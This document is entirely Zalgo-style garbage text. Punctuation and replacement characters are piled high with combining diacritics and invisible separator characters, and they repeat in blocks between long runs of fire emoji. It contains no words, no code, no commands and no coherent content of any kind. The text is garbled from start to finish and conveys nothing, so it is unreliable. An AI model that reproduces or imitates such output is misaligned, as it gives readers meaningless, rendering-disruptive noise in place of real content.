̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̿̿̀̊̒́̀